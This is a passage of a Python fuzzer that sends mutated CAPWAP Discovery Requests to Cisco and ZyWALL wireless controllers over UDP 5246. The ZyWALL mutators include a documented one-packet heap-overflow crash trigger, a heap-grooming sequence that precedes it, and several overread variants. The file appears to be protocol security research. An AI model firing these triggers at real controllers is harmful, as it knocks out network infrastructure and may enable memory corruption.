"""Discovery-stage plaintext fuzzer (plan: Discovery 变异强化与阶段开关, D0/D1).

Runs on the CAPWAP control channel (UDP 5246) with no DTLS: every round
serialises the golden Cisco Discovery Request for one AP identity, applies one
registered mutation, and sends the resulting datagram(s) from a fresh source
port.  Wire-level verdicts are ``answered`` / ``silence`` plus a canary check
on every reply (declared vs actual length — the M1 over-read oracle).

Mutation layers (registry ``MUTATORS``; select via ``--variants m1,m2`` or
individual names):

``m1``  length crossings — Control_Header MsgElemsLen / element Length / HLEN
        vs the actual byte count (RFC 5415 §4.5.1.3, §4.3).
``m2``  fragment fields — F/L bits, Fragment ID, Fragment Offset (8-octet
        units), reserved bits (§4.3; overlapping fragments forbidden, txt 2717).
``m3``  header matrix — preamble Version/Type, WBID, T/K/M bits, RID, header
        Flags, optional WSI field (§4.1, §4.3).
``m4``  nested TLV / VSP depth — element Value internals, unassigned VSP
        ElemIDs (§4.6.39 frame; nest structure is vendor-private input).
``m5``  plaintext channel edges — non-Discovery MsgTypes on the clear-text
        control channel (§4.1 MUST-drop rule), undefined MsgType, SeqNum edges.
``m6``  element level — the classic random invalid-element generator (kept for
        baseline continuity).

Field authority: docs/reference/RFC5415-头部与分片字段表-20260921.md (workspace
copy of RFC 5415 with line numbers) — do not add variants that cite anything
else.
"""

from __future__ import annotations

import hashlib
import json
import socket
import struct
import time
from pathlib import Path
from typing import Callable

from capwap_discovery_fuzzer.stage_fuzzer import _element_offsets, _hlen, _patch_element
from capwap_discovery_fuzzer.vendors.cisco.creator import ApIdentity, CiscoPayloadCreator
from capwap_discovery_fuzzer.vendors.cisco.elements import CISCO_VENDOR_ID
from capwap_discovery_fuzzer.vendors.zywall.creator import ZywallIdentity, ZywallPayloadCreator
from capwap_discovery_fuzzer.request_creater import Payload_Creator

# --------------------------------------------------------------------------
# raw-header bit helpers (layout per RFC 5415 §4.3 — see the field table doc;
# verified against the Scapy-packed golden seed: byte2 = RID[1:0]<<6 | WBID<<1
# | T, byte3 = F<<7 | L<<6 | W<<5 | M<<4 | K<<3 | Flags).
#   byte0 = version<<4 | preamble_type
#   byte1 = hlen<<3 | rid>>2
#   bytes4-5 = Fragment ID; bytes6-7 = FragOffset(13b) | Rsvd(3b)


def _set_preamble(raw: bytes, version: int | None = None,
                  ptype: int | None = None) -> bytes:
    v = (raw[0] >> 4) if version is None else version & 0xF
    t = (raw[0] & 0xF) if ptype is None else ptype & 0xF
    return bytes([(v << 4) | t]) + raw[1:]


def _set_bits3(raw: bytes, *, hlen: int | None = None, rid: int | None = None,
               wbid: int | None = None, t: int | None = None,
               f: int | None = None, l: int | None = None,
               w: int | None = None, m: int | None = None,
               k: int | None = None, flags: int | None = None) -> bytes:
    """Rewrite any of the 24 header bits after the preamble byte."""
    out = bytearray(raw)
    nh = ((raw[1] >> 3) & 0x1F) if hlen is None else hlen & 0x1F
    cur_rid = ((raw[1] & 0x7) << 2) | (raw[2] >> 6)
    nr = cur_rid if rid is None else rid & 0x1F
    nw = ((raw[2] >> 1) & 0x1F) if wbid is None else wbid & 0x1F
    nt = (raw[2] & 1) if t is None else t & 1
    out[1] = (nh << 3) | (nr >> 2)
    out[2] = ((nr & 3) << 6) | (nw << 1) | nt
    b3 = raw[3]
    if f is not None:
        b3 = (b3 | 0x80) if f else (b3 & 0x7F)
    if l is not None:
        b3 = (b3 | 0x40) if l else (b3 & 0xBF)
    if w is not None:
        b3 = (b3 | 0x20) if w else (b3 & 0xDF)
    if m is not None:
        b3 = (b3 | 0x10) if m else (b3 & 0xEF)
    if k is not None:
        b3 = (b3 | 0x08) if k else (b3 & 0xF7)
    if flags is not None:
        b3 = (b3 & 0xF8) | (flags & 0x7)
    out[3] = b3
    return bytes(out)


def _set_frag(raw: bytes, frag_id: int | None = None,
              offset_units: int | None = None, rsvd: int | None = None) -> bytes:
    out = bytearray(raw)
    if frag_id is not None:
        out[4:6] = (frag_id & 0xFFFF).to_bytes(2, "big")
    units = (((raw[6] << 8) | raw[7]) >> 3) if offset_units is None \
        else offset_units & 0x1FFF
    rv = (raw[7] & 0x7) if rsvd is None else rsvd & 0x7
    out[6] = (units >> 5) & 0xFF
    out[7] = ((units & 0x1F) << 3) | rv
    return bytes(out)


def _ctrl_off(raw: bytes) -> int:
    """Offset of the Control Header (= HLEN*4, RFC 5415 §4.3)."""
    return _hlen(raw)


def _get_msgtype(raw: bytes) -> int:
    return int.from_bytes(raw[_ctrl_off(raw):_ctrl_off(raw) + 4], "big")


def _set_msgtype(raw: bytes, msgtype: int) -> bytes:
    off = _ctrl_off(raw)
    out = bytearray(raw)
    out[off:off + 4] = (msgtype & 0xFFFFFFFF).to_bytes(4, "big")
    return bytes(out)


def _get_msgelemslen(raw: bytes) -> int:
    off = _ctrl_off(raw)
    return int.from_bytes(raw[off + 5:off + 7], "big")


def _set_msgelemslen(raw: bytes, value: int) -> bytes:
    off = _ctrl_off(raw)
    out = bytearray(raw)
    out[off + 5:off + 7] = (value & 0xFFFF).to_bytes(2, "big")
    return bytes(out)


def _set_elem_len(raw: bytes, elem_index: int, new_len: int) -> bytes:
    """Overwrite one element's Length field without touching any other byte."""
    _t, start, _elen = _element_offsets(raw)[elem_index]
    out = bytearray(raw)
    out[start + 2:start + 4] = (new_len & 0xFFFF).to_bytes(2, "big")
    return bytes(out)


def _append_element(raw: bytes, etype: int, value: bytes) -> bytes:
    out = raw + (etype.to_bytes(2, "big") + len(value).to_bytes(2, "big") + value)
    return _set_msgelemslen(out, _get_msgelemslen(raw) + 4 + len(value))


def _vsp_value(elem_id: int, data: bytes) -> bytes:
    """Vendor Specific Payload value: VendorID(4) + ElemID(2) + Data (§4.6.39)."""
    return CISCO_VENDOR_ID.to_bytes(4, "big") + elem_id.to_bytes(2, "big") + data


def _elements_region(raw: bytes) -> bytes:
    """The CAPWAP payload that gets fragmented: control header + elements."""
    return raw[_ctrl_off(raw):]


def _fragment_header(raw: bytes, *, frag_id: int, offset_units: int,
                     last: bool) -> bytes:
    """Only the header (HLEN*4 bytes) with F=1 and the fragment fields set."""
    header = _set_frag(_set_bits3(raw, f=1, l=1 if last else 0),
                       frag_id=frag_id, offset_units=offset_units)
    return header[:_hlen(raw) * 4]


def _split_point(payload: bytes) -> int:
    """Deterministic 8-byte-aligned split near the payload midpoint."""
    return max(8, (len(payload) // 2) // 8 * 8)


# --------------------------------------------------------------------------
# mutators.  Each builder(seed, rng) -> (datagrams, descriptor).

Mutator = Callable[[bytes, object], tuple[list[bytes], dict]]


def _m_base(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [seed], {"op": "base"}


def _m_len_decl_gt(seed: bytes, rng) -> tuple[list[bytes], dict]:
    old = _get_msgelemslen(seed)
    new = min(old + 64, 0xFFFF)
    return [_set_msgelemslen(seed, new)], {
        "op": "len-decl-gt", "old": old, "new": new, "cite": "RFC5415 §4.5.1.3"}


def _m_len_decl_lt(seed: bytes, rng) -> tuple[list[bytes], dict]:
    old = _get_msgelemslen(seed)
    return [_set_msgelemslen(seed, 0)], {
        "op": "len-decl-lt", "old": old, "new": 0, "cite": "RFC5415 §4.5.1.3"}


def _len_elem_overrun(target_type: int):
    """Factory: overrun the declared length of the vendor's identity element.

    Cisco seeds carry the fingerprint in element 38 (WTP Board Data); ZyWALL
    seeds carry it in element 39 (WTP Descriptor — modelId/fwVersion gates).
    """
    def m(seed: bytes, rng) -> tuple[list[bytes], dict]:
        elems = _element_offsets(seed)
        idx = next(i for i, (t, _s, _l) in enumerate(elems)
                   if t == target_type)
        return [_set_elem_len(seed, idx, 0xFFFF)], {
            "op": "len-elem-overrun", "elem_type": target_type,
            "new_len": 0xFFFF, "cite": "RFC5415 §4.5.1.5"}
    return m


#: registry default: Cisco element 38 (WTP Board Data) — unchanged behavior
_m_len_elem_overrun = _len_elem_overrun(38)

#: variants that only make sense against a ZyWALL seed (t39/t37 internals);
#: _builder_for substitutes a pass-through on non-ZyWALL identities so
#: ``--variants all`` keeps working on Cisco targets.
ZYWALL_ONLY_VARIANTS = frozenset({
    "t39-len2-joint", "t39-len1-joint", "t39-len2-band", "t39-len1-band",
    "t39-len2-ship-short", "t39-flags-shift", "t39-flags-pad",
    "t39-str1-pattern", "t39-gate-boundary", "t39-modelid-sweep",
    "t37-subelem-sweep", "elem-dup-t39", "elem-swap-39-37", "elem-drop-t39",
    "datagram-trunc-t39",
})


def _m_len_hlen_mismatch(seed: bytes, rng) -> tuple[list[bytes], dict]:
    cur = (seed[1] >> 3) & 0x1F
    return [_set_bits3(seed, hlen=2)], {
        "op": "len-hlen-mismatch", "old": cur, "new": 2,
        "cite": "RFC5415 §4.3 HLEN"}


def _m_frag_single_off(seed: bytes, rng) -> tuple[list[bytes], dict]:
    hdr = _fragment_header(seed, frag_id=1, offset_units=0, last=True)
    return [hdr + _elements_region(seed)], {
        "op": "frag-single-off", "frag_id": 1, "last": True,
        "cite": "RFC5415 §4.3 F/L/Fragment ID"}


def _m_frag_single_nolast(seed: bytes, rng) -> tuple[list[bytes], dict]:
    hdr = _fragment_header(seed, frag_id=2, offset_units=0, last=False)
    return [hdr + _elements_region(seed)], {
        "op": "frag-single-nolast", "frag_id": 2, "last": False,
        "cite": "RFC5415 §4.3 F/L"}


def _m_frag_missing(seed: bytes, rng) -> tuple[list[bytes], dict]:
    payload = _elements_region(seed)
    k = _split_point(payload)
    hdr = _fragment_header(seed, frag_id=3, offset_units=0, last=False)
    return [hdr + payload[:k]], {
        "op": "frag-missing", "frag_id": 3, "sent": k, "total": len(payload),
        "cite": "RFC5415 §4.3 L=0 (tail never sent)"}


def _m_frag_last_early(seed: bytes, rng) -> tuple[list[bytes], dict]:
    payload = _elements_region(seed)
    k = _split_point(payload)
    hdr = _fragment_header(seed, frag_id=4, offset_units=k // 8, last=True)
    return [hdr + payload[k:]], {
        "op": "frag-last-early", "frag_id": 4, "offset_units": k // 8,
        "cite": "RFC5415 §4.3 Frag Offset / L (first fragment absent)"}


def _m_frag_overlap(seed: bytes, rng) -> tuple[list[bytes], dict]:
    payload = _elements_region(seed)
    k = max(16, _split_point(payload))
    d1 = _fragment_header(seed, frag_id=5, offset_units=0, last=False) + payload[:k]
    # second fragment starts 8 bytes *before* the first ends — RFC-forbidden
    # overlap (txt 2717: "does not allow for overlapping fragments")
    d2 = (_fragment_header(seed, frag_id=5, offset_units=(k - 8) // 8, last=True)
          + payload[k - 8:])
    return [d1, d2], {
        "op": "frag-overlap", "frag_id": 5, "off1": 0, "off2": (k - 8) // 8,
        "cite": "RFC5415 §4.3 txt2717"}


def _m_frag_dup(seed: bytes, rng) -> tuple[list[bytes], dict]:
    d = _fragment_header(seed, frag_id=6, offset_units=0, last=True) \
        + _elements_region(seed)
    return [d, d], {"op": "frag-dup", "frag_id": 6, "n": 2,
                    "cite": "RFC5415 §4.3 Fragment ID"}


def _m_frag_conflict(seed: bytes, rng) -> tuple[list[bytes], dict]:
    payload = _elements_region(seed)
    k = _split_point(payload)
    d1 = _fragment_header(seed, frag_id=7, offset_units=0, last=False) + payload[:k]
    d2 = _fragment_header(seed, frag_id=7, offset_units=0, last=True) + payload[k:]
    return [d1, d2], {
        "op": "frag-conflict", "frag_id": 7,
        "cite": "RFC5415 §3.4 Fragment ID mis-association"}


def _m_frag_oob_offset(seed: bytes, rng) -> tuple[list[bytes], dict]:
    hdr = _fragment_header(seed, frag_id=8, offset_units=0x1FFF, last=True)
    return [hdr + _elements_region(seed)], {
        "op": "frag-oob-offset", "offset_units": 0x1FFF,
        "cite": "RFC5415 §4.3 Frag Offset"}


def _m_frag_rsvd_nonzero(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_frag(seed, rsvd=0x7)], {
        "op": "frag-rsvd-nonzero", "rsvd": 0x7,
        "cite": "RFC5415 §4.3 Rsvd MUST zero"}


def _hdr_version(version: int) -> Mutator:
    def m(seed: bytes, rng) -> tuple[list[bytes], dict]:
        return [_set_preamble(seed, version=version)], {
            "op": f"hdr-version-{version}", "cite": "RFC5415 §4.1 Version=0"}
    return m


def _m_hdr_ptype_dtls(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_preamble(seed, ptype=1)], {
        "op": "hdr-ptype-dtls",
        "cite": "RFC5415 §4.1 Type=1 → §4.2 DTLS Header"}


def _hdr_wbid(v: int) -> Mutator:
    def m(seed: bytes, rng) -> tuple[list[bytes], dict]:
        return [_set_bits3(seed, wbid=v)], {
            "op": f"hdr-wbid-{v}", "cite": "RFC5415 §4.3 WBID 0/2 Reserved"}
    return m


def _m_hdr_t_bit(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_bits3(seed, t=1)], {
        "op": "hdr-t-bit", "cite": "RFC5415 §4.3 T (native frame on ctrl ch)"}


def _m_hdr_k_bit(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_bits3(seed, k=1)], {
        "op": "hdr-k-bit", "cite": "RFC5415 §4.3 K (keep-alive on ctrl ch)"}


def _m_hdr_m0(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_bits3(seed, m=0)], {
        "op": "hdr-m0",
        "cite": "RFC5415 §4.3 M=0 while optional MAC field still occupies HLEN"}


def _m_hdr_rid_31(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_bits3(seed, rid=31)], {
        "op": "hdr-rid-31", "cite": "RFC5415 §4.3 RID 1..31 (practice: 0)"}


def _m_hdr_flags_nonzero(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_bits3(seed, flags=0x7)], {
        "op": "hdr-flags-nonzero", "cite": "RFC5415 §4.3 Flags MUST zero"}


def _m_hdr_wsi(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Insert a Wireless Specific Information optional field (W=1, §4.3).

    WSI field = Length(1B) + Data, zero-padded to 4-byte alignment; the header
    grows by one 4-byte word (HLEN 4→6 beside the MAC optional field).
    """
    hlen = (seed[1] >> 3) & 0x1F
    head, rest = seed[:hlen * 4], seed[hlen * 4:]
    wsi = bytes([4]) + b"\xde\xad\xbe\xef"
    padded = wsi + b"\x00" * ((-len(wsi)) % 4)
    new_head = _set_bits3(head + padded, w=1, hlen=hlen + len(padded) // 4)
    return [new_head + rest], {
        "op": "hdr-wsi-present", "wsi_padded": len(padded),
        "cite": "RFC5415 §4.3 W / Wireless Specific Information"}


def _nested_tlv(depth: int, inner: bytes, bad_len: bool = False) -> bytes:
    """{u16 type, u16 len, value} chain nested ``depth`` deep (vendor-private)."""
    for _ in range(depth):
        ln = 0xFFFF if bad_len else len(inner)
        inner = (1).to_bytes(2, "big") + ln.to_bytes(2, "big") + inner
    return inner


def _m_nest_depth(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_append_element(seed, 37, _vsp_value(207, _nested_tlv(4, b"\xaa")))], {
        "op": "nest-depth-4", "elem": 37, "elemid": 207,
        "cite": "RFC5415 §4.6.39 frame; nesting vendor-private"}


def _m_nest_len_bad(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_append_element(seed, 37,
                            _vsp_value(207, _nested_tlv(2, b"\xbb", bad_len=True)))], {
        "op": "nest-len-bad", "elem": 37, "elemid": 207, "inner_len": 0xFFFF,
        "cite": "RFC5415 §4.6.39 frame"}


def _m_elemid_sweep(seed: bytes, rng) -> tuple[list[bytes], dict]:
    out = seed
    for eid in (0x0001, 0x00FF, 0x7FFF, 0xFFFF):
        out = _append_element(out, 37, _vsp_value(eid, b"\x00\x00\x00\x00"))
    return [out], {
        "op": "elemid-sweep", "elemids": [1, 255, 32767, 65535],
        "cite": "RFC5415 §4.6.39; unassigned ElemID namespace (Cisco)"}


def _m_plain_non_disc(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_msgtype(seed, 5)], {
        "op": "plain-non-disc", "msgtype": 5,
        "cite": "RFC5415 §4.1 Type=0 drop rule (§4.5.1.1: 5=Config Status Req)"}


def _m_plain_echo(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_msgtype(seed, 13)], {
        "op": "plain-echo", "msgtype": 13,
        "cite": "RFC5415 §4.1 drop rule (13=Echo Request)"}


def _m_msgtype_undef(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [_set_msgtype(seed, 100)], {
        "op": "msgtype-undef", "msgtype": 100,
        "cite": "RFC5415 §15.4 values 1-26 allocated"}


def _m_seq_jump(seed: bytes, rng) -> tuple[list[bytes], dict]:
    off = _ctrl_off(seed)
    out = bytearray(seed)
    out[off + 4] = 200
    return [bytes(out)], {"op": "seq-jump", "seq": 200,
                          "cite": "RFC5415 §4.5.1.2"}


def _m_seq_dup(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [seed, seed], {"op": "seq-dup", "n": 2,
                          "cite": "RFC5415 §4.5.3 duplicate Sequence Number"}


def _m_classic_random(seed: bytes, rng) -> tuple[list[bytes], dict]:
    pkt = Payload_Creator(rng=rng).create_discovery_request(valid=False)
    return [bytes(pkt)], {"op": "classic-random",
                          "cite": "existing element-level generator (M6)"}


# --------------------------------------------------------------------------
# m7 — vendor-inner mutation (ZyWALL element 39/37 Value internals).
#
# Field authority: vendors/zywall/elements.py docstring (capwap_msg_get_t39
# @ capwap_srv 0x100417f8, in-loop calibrated 2026-09-23).  Honest layout
# (flags==0): len1@+19, str1@+21, len2@+27+len1, str2@+29+len1.  The AC's
# capwap_msg_get_t39 memcpy's str1/str2 into fixed 33-byte heap fields with a
# single gate "declared length <= element TLV Len" (capwap_msg.c:2286 gate;
# F2 2026-09-23: directed packet with len2=0x4000 + TLV=0xFFFF = one-packet
# SIGSEGV).  flags!=0 makes the parser swallow +3..+5, shifting every later
# field by 3 bytes — content bytes then get read as lengths (F1's accidental
# hit).  On non-ZyWALL seeds these variants are vendor-skipped via
# _builder_for; a ZyWALL seed without the element degrades to a pass-through.

INTERESTING_U16 = (34, 0x40, 0x100, 0x400, 0x1000, 0x4000, 0xFFFF)

#: known t37 fish sub-element ids and their fixed read lengths (field table
#: §Discovery(1) element 37; unknown ids abort the container walk)
T37_SUBELEM_LENS = {0x3: 8, 0x6: 24, 0x13: 4, 0x14: 4, 0x15: 4, 0x16: 256,
                    0x17: 4, 0x18: 4, 0x1A: 4, 0x1C: 8, 0x1D: 32}


def _m_vendor_skip(seed: bytes, rng) -> tuple[list[bytes], dict]:
    return [seed], {"op": "vendor-skip",
                    "note": "zywall-only variant on a non-zywall seed"}


def _find_elem(raw: bytes, etype: int) -> int | None:
    for i, (t, _s, _l) in enumerate(_element_offsets(raw)):
        if t == etype:
            return i
    return None


def _t39_value(raw: bytes) -> tuple[int, memoryview | bytes]:
    """(element index, value bytes) of the honest-layout t39 element."""
    idx = _find_elem(raw, 39)
    if idx is None:
        return None, b""
    _t, start, elen = _element_offsets(raw)[idx]
    return idx, raw[start + 4:start + 4 + elen]


def _zy_t39_geom(value: bytes) -> dict:
    """Offsets of an honest-layout (flags==0) t39 value per the field table."""
    if len(value) < 30 or value[2] != 0:
        raise ValueError("t39 inner mutators need the honest layout (flags==0)")
    len1 = int.from_bytes(value[19:21], "big")
    if 21 + len1 + 8 > len(value):
        raise ValueError("t39 len1 out of the honest value bounds")
    return {"len1": len1, "len2": int.from_bytes(value[27 + len1:29 + len1], "big"),
            "l2_off": 27 + len1, "str2_off": 29 + len1}


def _t39_mutate(seed: bytes, *, flags: int | None = None,
                max_radios: int | None = None, used_radios: int | None = None,
                model_id: int | None = None, l1: int | None = None,
                l2: int | None = None, str1_pattern: bytes | None = None,
                pad3_after_flags: bool = False, drop_str2: bool = False,
                tlv_len: int | None = None) -> bytes:
    """Patch t39 value internals on an honest seed; TLV/MsgElemsLen follow
    the new value length honestly unless ``tlv_len`` overrides the TLV."""
    idx = _find_elem(seed, 39)
    if idx is None:
        return seed
    _t, start, elen = _element_offsets(seed)[idx]
    v = bytearray(seed[start + 4:start + 4 + elen])
    try:
        g = _zy_t39_geom(bytes(v))
    except ValueError:
        return seed
    if pad3_after_flags:
        # flags!=0 shifts the parser cursor +3; inserting 3 filler bytes
        # realigns the honest layout downstream (negative control).
        v = v[:3] + b"\x00\x00\x00" + v[3:]
    if flags is not None:
        v[2] = flags & 0xFF
    if max_radios is not None:
        v[0] = max_radios & 0xFF
    if used_radios is not None:
        v[1] = used_radios & 0xFF
    if model_id is not None:
        v[11:13] = (model_id & 0xFFFF).to_bytes(2, "big")
    if l1 is not None:
        v[19:21] = (l1 & 0xFFFF).to_bytes(2, "big")
    if str1_pattern is not None:
        v[21:21 + g["len1"]] = str1_pattern[:g["len1"]]
    if l2 is not None:
        v[g["l2_off"]:g["l2_off"] + 2] = (l2 & 0xFFFF).to_bytes(2, "big")
    if drop_str2:
        v = v[:g["str2_off"]]
    out = _patch_element(seed, idx, bytes(v))
    if tlv_len is not None:
        out = _set_elem_len(out, idx, tlv_len)
    return out


def _m_t39_len2_joint(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Deterministic killer (F2-verified): declared str2 length 0x4000 into
    the 33-byte heap field, TLV inflated to open the sole gate."""
    out = _t39_mutate(seed, l2=0x4000, tlv_len=0xFFFF)
    return [out], {"op": "t39-len2-joint", "l2": 0x4000, "tlv": 0xFFFF,
                   "cite": "capwap_msg_get_t39+1040: memcpy(struct+2446[33B], "
                           "cursor, l2), sole gate l2<=TLV (F2 2026-09-23)"}


def _m_t39_len1_joint(seed: bytes, rng) -> tuple[list[bytes], dict]:
    out = _t39_mutate(seed, l1=0x4000, tlv_len=0xFFFF)
    return [out], {"op": "t39-len1-joint", "l1": 0x4000, "tlv": 0xFFFF,
                   "cite": "capwap_msg_get_t39+724: memcpy(struct+2413[33B], "
                           "cursor, l1), sole gate l1<=TLV"}


def _m_t39_len2_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
    l2 = rng.choice(INTERESTING_U16)
    inflate = rng.choice([True, False])
    out = _t39_mutate(seed, l2=l2, tlv_len=0xFFFF if inflate else None)
    return [out], {"op": "t39-len2-band", "l2": l2,
                   "tlv": 0xFFFF if inflate else "honest"}


def _m_t39_len1_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
    l1 = rng.choice(INTERESTING_U16)
    inflate = rng.choice([True, False])
    out = _t39_mutate(seed, l1=l1, tlv_len=0xFFFF if inflate else None)
    return [out], {"op": "t39-len1-band", "l1": l1,
                   "tlv": 0xFFFF if inflate else "honest"}


def _m_t39_len2_ship_short(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Declared len2 far beyond the bytes actually shipped — the read-side
    (MAPERR) form of the same unbounded copy."""
    out = _t39_mutate(seed, l2=0x8000, tlv_len=0xFFFF, drop_str2=True)
    return [out], {"op": "t39-len2-ship-short", "l2": 0x8000, "tlv": 0xFFFF,
                   "shipped_str2_bytes": 0}


def _m_t39_flags_shift(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """flags!=0 (swallow +3..+5) with the honest layout untouched — the
    parser then reads len1 from str1 content bytes (content-as-length)."""
    flags = rng.choice([1, 0x7F, 0x80, 0xFF])
    out = _t39_mutate(seed, flags=flags, tlv_len=0xFFFF)
    return [out], {"op": "t39-flags-shift", "flags": flags, "tlv": 0xFFFF,
                   "cite": "flags!=0 swallows value[3..5]; F1 accidental hit "
                           "mechanism, automated"}


def _m_t39_flags_pad(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Negative control: flags!=0 plus 3 filler bytes — the shifted cursor
    realigns with the honest layout, so the parse must stay harmless."""
    out = _t39_mutate(seed, flags=0xFF, pad3_after_flags=True)
    return [out], {"op": "t39-flags-pad", "flags": 0xFF, "pad_bytes": 3,
                   "expect": "no-crash (gate-semantics control)"}


def _m_t39_str1_pattern(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Grooming pattern in str1 (declared length honest) — overflow content
    control for the copy destinations / residual buffer (F2 grooming)."""
    pat = rng.choice([b"\xff\x7f", b"\x00\x01", b"\x41\x41"]) * 8
    out = _t39_mutate(seed, str1_pattern=pat)
    return [out], {"op": "t39-str1-pattern", "pattern": pat[:2].hex(),
                   "declared_len1": "honest"}


def _m_t39_gate_boundary(seed: bytes, rng) -> tuple[list[bytes], dict]:
    mx, used = rng.choice([(0, 0), (1, 0), (2, 0), (2, 3), (4, 4), (5, 5),
                           (4, 255), (255, 255)])
    out = _t39_mutate(seed, max_radios=mx, used_radios=used)
    return [out], {"op": "t39-gate-boundary", "max_radios": mx, "used": used,
                   "cite": "admission gates 0<Max<5, 0<Used<=Max edges"}


def _m_t39_modelid_sweep(seed: bytes, rng) -> tuple[list[bytes], dict]:
    mid = rng.choice([0, 0x26E0, 0x26E2, 0xFFFF])
    out = _t39_mutate(seed, model_id=mid)
    return [out], {"op": "t39-modelid-sweep", "model_id": hex(mid)}


def _m_t37_subelem_sweep(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Append one known-id fish sub-element with a truncated value — every
    known id is a fixed-length read with no bounds check (overread family)."""
    idx = _find_elem(seed, 37)
    if idx is None:
        return [seed], {"op": "t37-subelem-sweep", "skipped": "no element 37"}
    sub_id = rng.choice(sorted(T37_SUBELEM_LENS))
    full = T37_SUBELEM_LENS[sub_id]
    vlen = rng.choice([full, full - 1, max(1, full // 2)])
    _t, start, elen = _element_offsets(seed)[idx]
    v = bytes(seed[start + 4:start + 4 + elen]) \
        + struct.pack(">H", sub_id) + b"\x5a" * vlen
    out = _patch_element(seed, idx, v)
    return [out], {"op": "t37-subelem-sweep", "sub_id": hex(sub_id),
                   "vlen": vlen, "fixed_read_len": full}


# --------------------------------------------------------------------------
# m8 — element-level structural operations on the discovery frame

def _m_elem_len_shrink(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Shrink an element's declared TLV length below its actual bytes — the
    parser trusts declarations, so walks/skips cross element boundaries."""
    etype = rng.choice([39, 37])
    idx = _find_elem(seed, etype)
    if idx is None:
        return [seed], {"op": "elem-len-shrink", "skipped": f"no element {etype}"}
    _t, _s, elen = _element_offsets(seed)[idx]
    k = rng.choice([1, 2, 3, 4, 8])
    new = max(0, elen - k)
    out = _set_elem_len(seed, idx, new)
    return [out], {"op": "elem-len-shrink", "elem_type": etype,
                   "old_len": elen, "new_len": new}


def _m_len_tiny_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
    actual = _get_msgelemslen(seed)
    delta = rng.choice([None, None, -3, -2, -1, 1, 2, 3])
    if delta is None:
        new = rng.choice([0, 1, 2, 3, 4])
    else:
        new = max(0, min(0xFFFF, actual + delta))
    out = _set_msgelemslen(seed, new)
    return [out], {"op": "len-tiny-band", "old": actual, "new": new,
                   "cite": "ZyWALL Len counts net elements (+3 semantics); "
                           "±1..3 is the fencepost band"}


def _m_elem_dup_t39(seed: bytes, rng) -> tuple[list[bytes], dict]:
    idx = _find_elem(seed, 39)
    if idx is None:
        return [seed], {"op": "elem-dup-t39", "skipped": "no element 39"}
    _t, start, elen = _element_offsets(seed)[idx]
    value = seed[start + 4:start + 4 + elen]
    out = _append_element(seed, 39, value)
    return [out], {"op": "elem-dup-t39", "cite": "duplicate wtpInfo writer"}


def _m_elem_swap_39_37(seed: bytes, rng) -> tuple[list[bytes], dict]:
    i39, i37 = _find_elem(seed, 39), _find_elem(seed, 37)
    if i39 is None or i37 is None:
        return [seed], {"op": "elem-swap-39-37", "skipped": "seed lacks 39/37"}
    elems = _element_offsets(seed)
    blocks = [seed[s:s + 4 + l] for _t, s, l in elems]
    blocks[i39], blocks[i37] = blocks[i37], blocks[i39]
    head = seed[:_ctrl_off(seed) + 8]
    out = head + b"".join(blocks)  # same total length ⇒ MsgElemsLen valid
    return [out], {"op": "elem-swap-39-37"}


def _m_elem_drop_t39(seed: bytes, rng) -> tuple[list[bytes], dict]:
    idx = _find_elem(seed, 39)
    if idx is None:
        return [seed], {"op": "elem-drop-t39", "skipped": "no element 39"}
    out = _patch_element(seed, idx, None)
    return [out], {"op": "elem-drop-t39",
                   "cite": "gate starvation: Max/Used/IANA read zeros"}


def _m_elem_tail_garbage(seed: bytes, rng) -> tuple[list[bytes], dict]:
    n = rng.choice([1, 2, 4, 8, 16])
    out = _set_msgelemslen(seed + b"\xa5" * n, _get_msgelemslen(seed) + n)
    return [out], {"op": "elem-tail-garbage", "n": n,
                   "cite": "declared-area tail bytes after the last element"}


def _m_datagram_trunc(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Cut the frame right after t39's len2 field — declared lengths still
    describe the full structure, actual bytes stop mid-element."""
    idx = _find_elem(seed, 39)
    if idx is None:
        return [seed], {"op": "datagram-trunc-t39", "skipped": "no element 39"}
    _t, start, _elen = _element_offsets(seed)[idx]
    v = seed[start + 4:]
    try:
        g = _zy_t39_geom(v)
    except ValueError:
        return [seed], {"op": "datagram-trunc-t39", "skipped": "layout"}
    cut = start + 4 + g["l2_off"] + 2
    return [seed[:cut]], {"op": "datagram-trunc-t39", "cut_at": cut,
                          "declared": "unchanged (complete)", "actual": cut}


# --------------------------------------------------------------------------
# m9 — stacked mutations, grooming sequences, length-field dictionary

def _m_groom_then_trigger(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Grooming sequence (F2: pattern packets steer the overflow content and
    can flip the fault form) followed by the deterministic killer."""
    pattern = _t39_mutate(seed, str1_pattern=b"\xff\x7f" * 8)
    trigger = _t39_mutate(seed, l2=0x4000, tlv_len=0xFFFF)
    return [pattern, pattern, pattern, trigger], {
        "op": "groom-then-trigger", "groom_rounds": 3,
        "pattern": "ff7f", "trigger": {"l2": 0x4000, "tlv": 0xFFFF}}


def _m_magic_dix_len_fields(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """Write one interesting value into one length-ish field (dictionary
    method: boundary lengths + the target's magic flags byte)."""
    target = rng.choice(["msgelemslen", "tlv39", "tlv37", "l1", "l2"])
